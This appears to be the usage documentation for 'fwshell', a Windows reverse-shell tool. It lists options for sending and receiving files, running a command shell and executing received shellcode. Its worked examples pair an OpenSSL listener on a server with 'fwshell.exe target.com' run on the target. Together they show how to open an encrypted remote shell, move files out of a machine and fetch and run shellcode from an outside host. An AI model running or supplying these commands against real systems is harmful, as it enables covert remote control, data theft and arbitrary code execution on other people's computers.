Usage
-----

Usage: fwshell [options] hostname [port (default: 4444)]
 -r filename         Send a file.
 -w filename         Receive a file.
 -c command          Command to execute (default: cmd).
 -s                  Receive a shellcode and execute it.
 -E                  Turn off TLS encryption.
 -t delay            Retry every delay seconds.

Caveats
-------

SSL certificate pinning is not (yet?) implemented.

Reverse shell
-------------

On the server:
$ openssl s_server -quiet -no_ssl2 -no_ssl3 -key cert.pem -cert cert.pem -accept 4444

On the target:
C:> fwshell.exe target.com


Receiving a file
----------------

On the server:
$ openssl s_server -quiet -no_ssl2 -no_ssl3 -key cert.pem -cert cert.pem -accept 4444 > file

On the target:
C:> fwshell.exe target.com -r file

Sending a file
--------------

On the server:
$ cat file | openssl s_server -quiet -no_ssl2 -no_ssl3 -key cert.pem -cert cert.pem -accept 4444
Then kill openssl. There is a problem with OpenSSL s_server, it does not automatically disconnect after the end of input.

On the target:
C:> fwshell.exe target.com -w file

Executing a shellcode
----------------------

On the server:
$ cat shellcode.bin | openssl s_server -quiet -no_ssl2 -no_ssl3 -key cert.pem -cert cert.pem -accept 4444
Then kill openssl. There is a problem with OpenSSL s_server, it does not automatically disconnect after the end of input.

Note: This can fail with OpenSSL. Better use a different server.

On the target:
C:> fwshell.exe target.com -s